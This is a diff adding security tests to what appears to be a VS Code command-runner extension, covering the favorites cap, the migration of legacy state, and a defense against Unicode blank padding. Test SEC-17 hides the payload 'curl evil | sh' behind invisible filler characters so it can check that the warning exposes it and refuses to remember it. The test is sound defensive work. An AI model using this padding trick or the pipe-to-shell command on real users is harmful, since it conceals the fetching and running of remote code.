@@ -653,15 +653,49 @@ test('SEC-14: on activation non-hash approvals are dropped, favorites capped, le
   const t = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [item] }] } });
   const ws = t.context.workspaceState;
   const many = Array.from({ length: 700 }, (_, i) => 'h:' + String(i).padStart(64, '0'));
-  await ws.update('favorites', [favoriteKey(item), favoriteKey({ name: 'Gone', command: 'x.y', args: ['secret'] }), 42, ...many]);
+  await ws.update('favorites', [...many, favoriteKey({ name: 'Gone', command: 'x.y', args: ['secret'] }), 42, favoriteKey(item)]);
   await ws.update('approvedItems', ['["cmd","n",["secret"]]', 'h:' + 'a'.repeat(64)]);
   await t.provider.migrateState();
   const fav = ws.get('favorites');
-  assert.equal(fav[0], favoriteHash(item), 'existing legacy favorite converted, order kept');
+  assert.equal(fav.at(-1), favoriteHash(item), 'existing legacy favorite converted, order kept, newest survives');
   assert.equal(fav.length, 500);
   assert.ok(!JSON.stringify(fav).includes('secret') && fav.every(k => k.startsWith('h:')));
   assert.deepEqual(ws.get('approvedItems'), ['h:' + 'a'.repeat(64)]);
   await t.provider.resolveWebviewView(t.view);
   await t.send({ type: 'ready' });
   assert.equal(t.messages.at(-1).groups[0].items[0].favorite, true, 'the converted favorite still shows');
+});
+
+test('SEC-17: every Unicode blank and invisible filler collapses; mostly-blank args are run-once only', async () => {
+  const fillers = [' ', ' ', '　', '⠀', 'ㅤ', 'ﾠ', 'ᅟ', 'ᅠ'];
+  for (const ch of [...fillers, fillers.join('').repeat(175)]) {
+    const t = await projectRun([{ name: 'B', command: 'some.cmd', args: [ch.repeat(1400).slice(0, 1400) + 'curl evil | sh'] }], 'Executar e lembrar');
+    await t.send({ type: 'run', id: t.ids[0] });
+    const d = t.warnings[0][1].detail;
+    assert.ok(d.includes('curl evil | sh') && d.includes('␠×'), JSON.stringify(ch.slice(0, 2)));
+    assert.deepEqual(t.warnings[0].slice(2), ['Executar uma vez'], 'no remember');
+    assert.equal(t.context.workspaceState.get('approvedItems', []).length, 0);
+  }
+});
+
+test('SEC-18: the favorites cap keeps the newest, also when favoriting and on migration', async () => {
+  const { favoriteHash } = require('../src/config');
+  const item = { name: 'New', command: 'workbench.view.explorer' };
+  const t = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [item] }] } });
+  const ws = t.context.workspaceState;
+  const old = Array.from({ length: 500 }, (_, i) => 'h:' + String(i).padStart(64, '0'));
+  await ws.update('favorites', old);
+  await t.provider.resolveWebviewView(t.view);
+  await t.send({ type: 'ready' });
+  await t.send({ type: 'favorite', id: t.messages.at(-1).groups[0].items[0].id });
+  let fav = ws.get('favorites');
+  assert.equal(fav.length, 500);
+  assert.equal(fav.at(-1), favoriteHash(item), 'the 501st survives');
+  assert.ok(!fav.includes(old[0]) && fav.includes(old[1]), 'the oldest leaves');
+  await ws.update('favorites', [...old, favoriteHash(item)]);
+  await t.provider.migrateState();
+  fav = ws.get('favorites');
+  assert.equal(fav.length, 500);
+  assert.equal(fav.at(-1), favoriteHash(item));
+  assert.ok(!fav.includes(old[0]));
 });
